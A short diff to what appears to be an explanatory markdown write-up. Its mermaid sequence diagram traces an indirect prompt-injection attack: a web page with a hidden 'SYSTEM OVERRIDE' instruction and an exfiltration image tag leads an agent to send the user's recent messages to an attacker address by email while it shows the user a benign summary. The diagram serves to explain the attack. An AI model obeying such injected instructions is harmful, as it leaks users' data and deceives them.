@@ -66,11 +66,11 @@ sequenceDiagram
   R->>W: HTTP GET
   W-->>R: HTML with hidden instruction + exfil img tag
   R-->>A: raw text (attacker payload inside)
-  Note over A: Prompt assembly: system + user + tool_output<br/>Model sees flat token stream
+  Note over A: Prompt assembly: system + user + tool_output. Model sees flat token stream
   A->>A: Attention binds "SYSTEM OVERRIDE" to instruction circuit
   A->>S: tool:send_email(to=exfil@…, body=recent_messages)
   A-->>U: benign-looking summary
-  Note over S,W: OOB confirmation:<br/>attacker sees delivered mail<br/>or image fetch with query string
+  Note over S,W: OOB confirmation: attacker sees delivered mail or image fetch with query string
 ```
 
 ### Why each piece exists, and how it fails
